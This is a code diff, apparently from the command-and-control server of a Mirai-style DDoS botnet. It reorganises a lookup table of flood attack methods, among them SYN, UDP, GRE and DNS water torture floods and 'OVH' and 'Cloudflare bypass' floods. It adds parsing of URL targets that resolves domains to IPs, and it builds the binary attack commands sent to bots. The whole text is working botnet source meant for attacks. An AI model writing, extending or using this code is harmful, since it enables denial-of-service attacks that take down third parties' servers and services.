@@ -33,7 +33,7 @@ var flagInfoLookup map[string]FlagInfo = map[string]FlagInfo{
 	"rand":     FlagInfo{1, "Randomize packet data content, default is 1 (yes)"},
 	"tos":      FlagInfo{2, "TOS field value in IP header, default is 0"},
 	"ident":    FlagInfo{3, "ID field value in IP header, default is random"},
-	"ttl":      FlagInfo{4, "TTL field in IP header, default is 255"},
+	"ttl":      FlagInfo{4, "TTL field value in IP header, default is 255"},
 	"df":       FlagInfo{5, "Set the Dont-Fragment bit in IP header, default is 0"},
 	"sport":    FlagInfo{6, "Source port, default is random"},
 	"dport":    FlagInfo{7, "Destination port, default is random"},
@@ -64,66 +64,41 @@ var flagInfoLookup map[string]FlagInfo = map[string]FlagInfo{
 }
 
 /*
- * Attack method IDs - MUST MATCH bot/attack.h ATK_VEC_* values
- * UDP Floods: 0-19
- * TCP Floods: 20-39
- * Special: 40-49
- * HTTP/HTTPS: 50-59
- * Other: 60+
+ * Attack method IDs - Streamlined to remove duplicates
+ * Must match bot/attack.h ATK_VEC_* values
  */
 var attackInfoLookup map[string]AttackInfo = map[string]AttackInfo{
-	/* UDP Floods (0-19) */
-	"udp":        AttackInfo{0, []uint8{0, 1, 6, 7, 25}, "UDP flood with options"},
+	/* UDP Floods (0-7) - Core methods only */
+	"udp":        AttackInfo{0, []uint8{0, 1, 6, 7, 25}, "Standard UDP flood"},
 	"udpplain":   AttackInfo{1, []uint8{0, 1, 7}, "UDP plain flood"},
-	"std":        AttackInfo{2, []uint8{0, 1, 7}, "STD flood"},
-	"nudp":       AttackInfo{3, []uint8{7}, "NUDP flood"},
-	"udphex":     AttackInfo{4, []uint8{0, 7}, "UDP HEX flood"},
-	"socket-raw": AttackInfo{5, []uint8{0, 2, 3, 4, 5, 6, 7, 25}, "Raw socket UDP flood"},
-	"samp":       AttackInfo{6, []uint8{7}, "SAMP game UDP flood"},
-	"udp-strong": AttackInfo{7, []uint8{0, 1, 7}, "Strong UDP flood"},
-	"hex-flood":  AttackInfo{8, []uint8{0, 7}, "HEX UDP flood"},
-	"strong-hex": AttackInfo{9, []uint8{0, 7}, "Strong HEX flood"},
-	"ovhudp":     AttackInfo{10, []uint8{0, 1, 7}, "OVH UDP bypass"},
-	"cudp":       AttackInfo{11, []uint8{0, 1, 7}, "Custom UDP flood"},
-	"icee":       AttackInfo{12, []uint8{0, 1, 7}, "ICE UDP flood"},
-	"randhex":    AttackInfo{13, []uint8{0, 7}, "Random HEX flood"},
-	"ovh":        AttackInfo{14, []uint8{0, 1, 7}, "OVH UDP flood"},
-	"ovhdrop":    AttackInfo{15, []uint8{0, 1, 7}, "OVH drop flood"},
-	"nfo":        AttackInfo{16, []uint8{0, 1, 7}, "NFO UDP flood"},
+	"udphex":     AttackInfo{2, []uint8{0, 7}, "UDP HEX flood"},
+	"socket-raw": AttackInfo{3, []uint8{0, 2, 3, 4, 5, 6, 7, 25}, "Raw socket UDP flood"},
+	"samp":       AttackInfo{4, []uint8{7}, "SAMP game UDP flood"},
+	"ovhudp":     AttackInfo{5, []uint8{0, 1, 7}, "OVH UDP bypass"},
+	"dns":        AttackInfo{6, []uint8{7, 8, 9}, "DNS water torture"},
+	"vse":        AttackInfo{7, []uint8{7}, "Valve Source Engine flood"},
 
-	/* TCP Floods (20-39) */
+	/* TCP Floods (20-27) - Core methods only */
 	"tcp":       AttackInfo{20, []uint8{0, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "Raw TCP flood"},
 	"syn":       AttackInfo{21, []uint8{0, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "SYN flood"},
 	"ack":       AttackInfo{22, []uint8{0, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "ACK flood"},
-	"stomp":     AttackInfo{23, []uint8{7}, "TCP stomp"},
-	"hex":       AttackInfo{24, []uint8{0, 6, 7}, "HEX TCP flood"},
-	"stdhex":    AttackInfo{25, []uint8{0, 6, 7}, "STDHEX flood"},
-	"xmas":      AttackInfo{26, []uint8{0, 2, 3, 4, 5, 6, 7}, "XMAS TCP flood"},
-	"tcpall":    AttackInfo{27, []uint8{0, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "All TCP flags flood"},
-	"tcpfrag":   AttackInfo{28, []uint8{0, 2, 3, 4, 5, 6, 7}, "TCP fragment flood"},
-	"asyn":      AttackInfo{29, []uint8{0, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "Async SYN flood"},
-	"usyn":      AttackInfo{30, []uint8{0, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "USYN flood"},
-	"ackerpps":  AttackInfo{31, []uint8{0, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "ACKER PPS flood"},
-	"tcp-mix":   AttackInfo{32, []uint8{0, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "Mixed TCP flood"},
-	"tcpbypass": AttackInfo{33, []uint8{0, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "TCP bypass flood"},
-	"nflag":     AttackInfo{34, []uint8{0, 6, 7}, "No-flag TCP flood"},
-	"ovhnuke":   AttackInfo{35, []uint8{0, 6, 7}, "OVH nuke flood"},
+	"tcpfrag":   AttackInfo{23, []uint8{0, 2, 3, 4, 5, 6, 7}, "TCP fragment flood"},
+	"tcpbypass": AttackInfo{24, []uint8{0, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "TCP bypass flood"},
+	"xmas":      AttackInfo{25, []uint8{0, 2, 3, 4, 5, 6, 7}, "XMAS TCP flood"},
+	"greip":     AttackInfo{26, []uint8{0, 1, 2, 3, 4, 5, 6, 7, 19, 25}, "GRE IP flood"},
+	"mixed":     AttackInfo{27, []uint8{0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "Mixed TCP+UDP"},
 
-	/* Special Attacks (40-49) */
-	"vse":       AttackInfo{40, []uint8{7}, "Valve Source Engine flood"},
-	"dns":       AttackInfo{41, []uint8{7, 8, 9}, "DNS water torture"},
-	"greip":     AttackInfo{42, []uint8{0, 1, 2, 3, 4, 5, 6, 7, 19, 25}, "GRE IP flood"},
-	"greeth":    AttackInfo{43, []uint8{0, 1, 2, 3, 4, 5, 6, 7, 19, 25}, "GRE Ethernet flood"},
-	"homeslam":  AttackInfo{44, []uint8{4}, "ICMP ping flood"},
-	"udpbypass": AttackInfo{45, []uint8{0, 1, 6, 7, 25}, "UDP bypass flood"},
-	"mixed":     AttackInfo{46, []uint8{0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "Mixed TCP+UDP bypass"},
+	/* Special Attacks (40-42) */
+	"homeslam":  AttackInfo{40, []uint8{4}, "ICMP ping flood"},
+	"udpbypass": AttackInfo{41, []uint8{0, 1, 6, 7, 25}, "UDP bypass flood"},
+	"greeth":    AttackInfo{42, []uint8{0, 1, 2, 3, 4, 5, 6, 7, 19, 25}, "GRE Ethernet flood"},
 
-	/* HTTP/HTTPS (50-59) */
+	/* HTTP/HTTPS (50-52) */
 	"http":      AttackInfo{50, []uint8{7, 8, 20, 21, 22, 24, 30}, "HTTP flood"},
 	"https":     AttackInfo{51, []uint8{7, 8, 20, 21, 22, 24, 30}, "HTTPS flood"},
-	"browserem": AttackInfo{52, []uint8{7, 8, 20, 22, 24, 30}, "Browser emulation with captcha bypass"},
+	"browserem": AttackInfo{52, []uint8{7, 8, 20, 22, 24, 30}, "Browser emulation"},
 
-	/* Cloudflare/Other (60+) */
+	/* Cloudflare (60) */
 	"cf": AttackInfo{60, []uint8{7, 8, 20, 21, 22, 24}, "Cloudflare bypass"},
 }
 
@@ -154,33 +129,73 @@ func NewAttack(str string, admin int) (*Attack, error) {
 		atk.Type = atkInfo.attackID
 	}
 
-	// Parse targets (can be multiple IPs/CIDRs)
-	for i := 1; i < len(args)-1; i++ {
-		if strings.Contains(args[i], "/") {
-			ip, prefix, err := net.ParseCIDR(args[i])
-			if err != nil {
-				return nil, errors.New("Invalid CIDR: " + args[i])
+	// Check if this is an HTTP/HTTPS attack (types 50-52, 60)
+	isHTTPAttack := (atk.Type >= 50 && atk.Type <= 52) || atk.Type == 60
+
+	if isHTTPAttack {
+		targetURL := args[1]
+		
+		if strings.HasPrefix(targetURL, "http://") || strings.HasPrefix(targetURL, "https://") {
+			domain := extractDomainFromURL(targetURL)
+			if domain != "" {
+				atk.Flags[8] = domain
 			}
-			ip = ip.To4()
-			if ip == nil {
-				return nil, errors.New("Invalid IPv4 address")
+			
+			path := extractPathFromURL(targetURL)
+			if path != "" && atk.Flags[22] == "" {
+				atk.Flags[22] = path
 			}
-			prefixLen, _ := prefix.Mask.Size()
-			atk.Targets[binary.BigEndian.Uint32(ip)] = uint8(prefixLen)
+			
+			if strings.HasPrefix(targetURL, "https://") {
+				atk.Flags[31] = "1"
+			}
 		} else {
-			ip := net.ParseIP(args[i])
-			if ip == nil {
-				return nil, errors.New("Invalid IP address: " + args[i])
+			atk.Flags[8] = targetURL
+		}
+		
+		domainOrIP := extractDomainFromURL(args[1])
+		if domainOrIP == "" {
+			domainOrIP = args[1]
+		}
+		if ip := net.ParseIP(domainOrIP); ip != nil && ip.To4() != nil {
+			atk.Targets[binary.BigEndian.Uint32(ip.To4())] = 32
+		} else if domainOrIP != "" {
+			if ips, err := net.LookupIP(domainOrIP); err == nil {
+				for _, resolvedIP := range ips {
+					if ipv4 := resolvedIP.To4(); ipv4 != nil {
+						atk.Targets[binary.BigEndian.Uint32(ipv4)] = 32
+						break
+					}
+				}
 			}
-			ip = ip.To4()
-			if ip == nil {
-				return nil, errors.New("Invalid IPv4 address")
+		}
+	} else {
+		for i := 1; i < len(args)-1; i++ {
+			if strings.Contains(args[i], "/") {
+				ip, prefix, err := net.ParseCIDR(args[i])
+				if err != nil {
+					return nil, errors.New("Invalid CIDR: " + args[i])
+				}
+				ip = ip.To4()
+				if ip == nil {
+					return nil, errors.New("Invalid IPv4 address")
+				}
+				prefixLen, _ := prefix.Mask.Size()
+				atk.Targets[binary.BigEndian.Uint32(ip)] = uint8(prefixLen)
+			} else {
+				ip := net.ParseIP(args[i])
+				if ip == nil {
+					return nil, errors.New("Invalid IP address: " + args[i])
+				}
+				ip = ip.To4()
+				if ip == nil {
+					return nil, errors.New("Invalid IPv4 address")
+				}
+				atk.Targets[binary.BigEndian.Uint32(ip)] = 32
 			}
-			atk.Targets[binary.BigEndian.Uint32(ip)] = 32
 		}
 	}
 
-	// Parse duration
 	duration, err := strconv.Atoi(args[len(args)-1])
 	if err != nil {
 		return nil, errors.New("Invalid duration: " + args[len(args)-1])
@@ -190,7 +205,6 @@ func NewAttack(str string, admin int) (*Attack, error) {
 	}
 	atk.Duration = uint32(duration)
 
-	// Parse flags
 	for i := 1; i < len(args)-1; i++ {
 		if strings.Contains(args[i], "=") {
 			parts := strings.SplitN(args[i], "=", 2)
@@ -209,28 +223,46 @@ func NewAttack(str string, admin int) (*Attack, error) {
 	return atk, nil
 }
 
+func extractDomainFromURL(urlStr string) string {
+	urlStr = strings.TrimPrefix(urlStr, "http://")
+	urlStr = strings.TrimPrefix(urlStr, "https://")
+	
+	if idx := strings.Index(urlStr, "/"); idx != -1 {
+		urlStr = urlStr[:idx]
+	}
+	
+	if idx := strings.Index(urlStr, ":"); idx != -1 {
+		urlStr = urlStr[:idx]
+	}
+	
+	return urlStr
+}
+
+func extractPathFromURL(urlStr string) string {
+	urlStr = strings.TrimPrefix(urlStr, "http://")
+	urlStr = strings.TrimPrefix(urlStr, "https://")
+	
+	if idx := strings.Index(urlStr, "/"); idx != -1 {
+		return urlStr[idx:]
+	}
+	
+	return "/"
+}
+
 func (this *Attack) Build() ([]byte, error) {
 	buf := make([]byte, 0)
 
-	// Duration (4 bytes)
 	buf = append(buf, byte(this.Duration>>24), byte(this.Duration>>16), byte(this.Duration>>8), byte(this.Duration))
-
-	// Attack type (1 byte)
 	buf = append(buf, byte(this.Type))
-
-	// Target count (1 byte)
 	buf = append(buf, byte(len(this.Targets)))
 
-	// Targets
 	for prefix, netmask := range this.Targets {
 		buf = append(buf, byte(prefix>>24), byte(prefix>>16), byte(prefix>>8), byte(prefix))
 		buf = append(buf, byte(netmask))
 	}
 
-	// Flag count (1 byte)
 	buf = append(buf, byte(len(this.Flags)))
 
-	// Flags
 	for key, value := range this.Flags {
 		buf = append(buf, byte(key))
 		buf = append(buf, byte(len(value)))
